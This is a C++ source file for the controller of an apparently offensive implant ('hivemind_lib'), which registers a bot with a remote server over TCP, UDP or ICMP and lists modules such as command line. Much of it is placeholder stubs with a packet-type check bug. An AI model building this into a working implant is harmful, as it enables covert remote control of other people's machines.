#include "logic_controller.hpp"

namespace hivemind_lib {
logic_controller::logic_controller() {
  // TODO Remove this
  ModuleInfo info;
  info.moduleDesc = "This contains the functions added separately from a module";
  info.moduleName = "EXTRA";
  this->modules.insert({info.moduleName, info});
  // Remove
  this->transportMethod = None;
}

void logic_controller::AddFunction(void *func) {
  // TODO Remove this
  ModuleFuncInfo func_info;
  func_info.moduleFuncName = "Name here";
  func_info.moduleFuncDesc = "No Description";
  // Remove
  this->modules.at("EXTRA").moduleFuncs.push_back(func_info);
}

int logic_controller::RegisterBot() {
  struct RegistrationRequest registration_request;
  struct Packet packet;
  struct ImplantInfo implant_info = {};

  std::vector<ModuleInfo> values;

  for (const auto &kv : this->modules) {
    values.push_back(kv.second);
  }

  // TODO Get this stuff
  registration_request.hostname = "Meep";
  registration_request.MAC = "aa:ss:dd:ff:gg:hh";
  registration_request.implantVersion = "asdf";
  registration_request.IP = this->implantInfo.primaryIP;
  registration_request.OS = "Windows trash";
  registration_request.supportedModules = values;
  //******************

  nlohmann::json j = nlohmann::json(registration_request);

  // TODO determine fingerprint
  packet.fingerprint = "fingerprint";
  packet.implantInfo = implant_info;
  packet.numLeft = 0;
  packet.packetType = RegistrationRequestCode;
  packet.data = j.dump();

  nlohmann::json p = nlohmann::json(packet);

  auto response = this->transport->SendAndReceive(p.dump());
  try {
    nlohmann::json resp = nlohmann::json::parse(response);
    auto packetResp = resp.get<Packet>();

    if (packetResp.packetType == RegistrationResponseCode) {
      DEBUG("Packet type received: " << packetResp.packetType, LEVEL_DEBUG);
      auto innerData = nlohmann::json::parse(packetResp.data);
      auto regResp = innerData.get<RegistrationResponse>();
      this->implantInfo.UUID = regResp.UUID;
    } else if (packet.packetType == ErrorCode) {
      DEBUG("Packet type received: " << packetResp.packetType, LEVEL_DEBUG);
      auto innerData = nlohmann::json::parse(packetResp.data);
      auto regError = innerData.get<Error>();
      DEBUG("Error with registration: " << regError.errorNum, LEVEL_ERROR);
      return regError.errorNum;
    } else {
      DEBUG("Unexpected packet type: " << packetResp.packetType, LEVEL_ERROR);
      return ErrorCode;
    }
  } catch (...) {
    DEBUG("Error thrown in registration", LEVEL_ERROR);
  }
  return 0;
}

void logic_controller::BeginComms() {

}

void logic_controller::AddModule(ModuleEnum mod) {
  switch (mod) {
    case All:DEBUG("Adding All Modules", LEVEL_DEBUG);
    case Ping:DEBUG("Adding Ping Module", LEVEL_DEBUG);
      if (mod != All) break;
    case CommandLine:DEBUG("Adding Command Line Module", LEVEL_DEBUG);
      break;
    default:DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
  }
}

void logic_controller::SetTransportMethod(Transport_Enum transport_enum) {
  this->transportMethod = transport_enum;
}

void logic_controller::InitComms(std::string hostname, std::string port) {
  switch (this->transportMethod) {
    case TCP:this->transport = std::make_unique<Tcp_Transport>(std::move(hostname), std::move(port));
      break;
    case UDP:this->transport = std::make_unique<Udp_Transport>(std::move(hostname), std::move(port));
      break;
    case ICMP:this->transport = std::make_unique<Icmp_Transport>(std::move(hostname), std::move(port));
      break;
    case None:
      DEBUG("No transport method chosen", LEVEL_ERROR);
      break;
  }
}
}